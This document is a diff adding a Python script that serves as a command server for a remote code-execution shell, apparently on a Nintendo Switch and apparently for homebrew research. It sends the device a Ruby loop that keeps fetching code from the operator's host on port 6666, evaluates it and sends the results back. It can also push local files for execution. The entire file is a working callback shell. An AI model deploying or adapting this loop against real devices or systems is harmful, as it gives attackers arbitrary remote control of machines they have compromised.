@@ -1,0 +1,93 @@
+#!/usr/bin/env python3
+import socket
+import readline
+import urllib.parse
+import re
+
+# Bootstrap: $repl.set_buffer 0, Object.http_get('http://XXX:6666/$init')
+# Usage: Type in a command to execute it
+# Commands:
+# .load: Load an execute a file from the server
+# .exit: Quit the REPL on the Switch
+
+OUTPUT_RE = re.compile('GET /(.*?) HTTP')
+REPL_CODE = """
+#
+
+def enc(s)
+  s.bytes.map {|c| sprintf("%%%02x", c)}.join('')
+end
+
+def run(code)
+  begin
+    $r = $ffi.parse code
+    if $r == 'Syntax OK'
+      $r = nil
+      $ffi.eval code
+    end
+  rescue Exception => e
+    $r = e
+  end
+  return $r.to_s
+end
+
+code = ''
+
+while code != nil
+  result = run(code)
+  code = Object.http_get('http://XXX:6666/' + enc(result))
+  if code.index('.load') == 0
+    parts = code.split(' ', 2)
+    code = parts[1]
+  elsif code == '.exit'
+    code = nil
+  end
+end
+"""
+
+def handle_command(data, cmd):
+    parts = cmd.split(' ')
+    if parts[0] == '.load':
+        return parts[0] + ' ' + open(parts[1], 'r').read()
+    return cmd
+
+def handle(sock):
+    # Repl loop
+    while True:
+        # Every request is a new connection
+        conn, addr = sock.accept()
+
+        # Get result
+        enc_data = ''
+        while not enc_data.endswith('\r\n\r\n'):
+            enc_data += conn.recv(4096).decode('utf8')
+        m = OUTPUT_RE.search(enc_data)
+        if not m:
+            print('[-] Error')
+        data = urllib.parse.unquote(m.group(1))
+
+        # Process commands
+        if data == '$init':
+            cmd = REPL_CODE
+        else:
+            print(data)
+            cmd = input('> ')
+
+            # special commands
+            if cmd.startswith('.'):
+                cmd = handle_command(data, cmd)
+                print(cmd)
+
+        # Send next command
+        conn.send(('HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\n%s' % (len(cmd), cmd)).encode('utf8'))
+        conn.close()
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+sock.bind(('', 6666))
+
+sock.listen(2)
+try:
+    handle(sock)
+except Exception as e:
+    sock.close()
+    raise e
